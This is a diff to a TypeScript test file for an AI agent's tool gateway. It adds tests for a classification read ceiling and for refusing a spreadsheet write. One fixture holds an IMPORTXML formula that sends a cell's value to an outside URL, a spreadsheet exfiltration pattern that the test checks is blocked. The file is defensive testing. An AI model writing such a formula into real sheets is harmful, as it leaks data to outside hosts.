@@ -137,6 +137,7 @@ function freshState(): DbState {
       workStopped: false,
       inputsOpen: true,
       classification: 'internal',
+      readCeiling: null,
       maxDelegationDepth: 1,
       allow: [
         'work.read',
@@ -438,6 +439,7 @@ describe('tool gateway', () => {
         state?: string;
       } | null,
       resource: { synced: boolean; access: ('read' | 'write' | 'owner')[] } | null = null,
+      answer: { classification: AiClassification; text: string } | null = null,
     ) => {
       const store = fakeStore(db);
       return createToolGateway({
@@ -471,9 +473,21 @@ describe('tool gateway', () => {
           requestSuiteRead: async (_tx, _context, input) => {
             suiteRequests.push(input);
           },
+          // The connector worker's answer, as the agent role reads it back.
+          readSuiteRead: async () =>
+            answer && {
+              status: 'read' as const,
+              output: Buffer.from(answer.text, 'utf8'),
+              mediaType: 'application/json',
+              classification: answer.classification,
+            },
+          closeSuiteRead: async (_tx, _context, input) => {
+            closed.push(input);
+          },
         },
       });
     };
+    const closed: unknown[] = [];
 
     const grant = (...tools: string[]) => {
       db.state.facts.allow = [...(db.state.facts.allow ?? []), ...tools];
@@ -482,6 +496,70 @@ describe('tool gateway', () => {
 
     beforeEach(() => {
       suiteRequests.length = 0;
+      closed.length = 0;
+    });
+
+    describe('collecting a read the connector worker answered', () => {
+      const DOCS = ['https://www.googleapis.com/auth/documents'];
+      const own = {
+        connectorType: 'google_workspace',
+        ownerMembershipId: MEMBER,
+        grantedScopes: DOCS,
+      };
+      const readDoc = () => {
+        grant('docs.read');
+        propose(
+          'docs.read',
+          { connection_id: CONNECTION, document_id: 'doc-1' },
+          { status: 'running' },
+        );
+      };
+
+      it('refuses content above the agent’s read ceiling, and keeps it nowhere', async () => {
+        readDoc();
+        db.state.facts.readCeiling = 'confidential';
+        const suite = withConnection(own, null, { classification: 'restricted', text: '{"a":1}' });
+        await expect(suite.handle(context, { ...step, collect: true })).resolves.toMatchObject({
+          outcome: 'denied',
+          decisionCode: 'CLASS_DENIED',
+        });
+        expect(closed).toEqual([{ proposalId: db.state.proposal?.id }]);
+        expect(db.state.outputs.every((output) => output.content.includes('"denied"'))).toBe(true);
+        expect(db.state.facts.classification).toBe('internal');
+        expect(db.state.audit.at(-1)).toMatchObject({ safeReason: 'ABOVE_READ_CEILING' });
+      });
+
+      it('keeps restricted content where no ceiling is declared, and the run becomes restricted', async () => {
+        readDoc();
+        const suite = withConnection(own, null, { classification: 'restricted', text: '{"a":1}' });
+        await expect(suite.handle(context, { ...step, collect: true })).resolves.toMatchObject({
+          outcome: 'done',
+        });
+        expect(db.state.facts.classification).toBe('restricted');
+        expect(db.state.outputs.at(-1)?.classification).toBe('restricted');
+      });
+    });
+
+    it('refuses a sheet write whose formula would fetch or link, and asks nobody', async () => {
+      grant('sheets.write_range');
+      propose('sheets.write_range', {
+        connection_id: CONNECTION,
+        spreadsheet_id: 'sheet-1',
+        range: 'A1:B1',
+        values: [['plain', ' =importxml ("https://example.invalid/?q="&A1, "//a")']],
+        value_input: 'raw',
+      });
+      const suite = withConnection({
+        connectorType: 'google_workspace',
+        ownerMembershipId: MEMBER,
+        grantedScopes: ['https://www.googleapis.com/auth/spreadsheets'],
+      });
+      await expect(suite.handle(context, step)).resolves.toMatchObject({
+        outcome: 'denied',
+        decisionCode: 'TOOL_ARGS_INVALID',
+      });
+      expect(db.state.audit.at(-1)).toMatchObject({ safeReason: 'FORMULA_REFUSED' });
+      expectNoEffect();
     });
 
     it('proposes the initiator’s own send with exactly what was asked, as a person must approve', async () => {
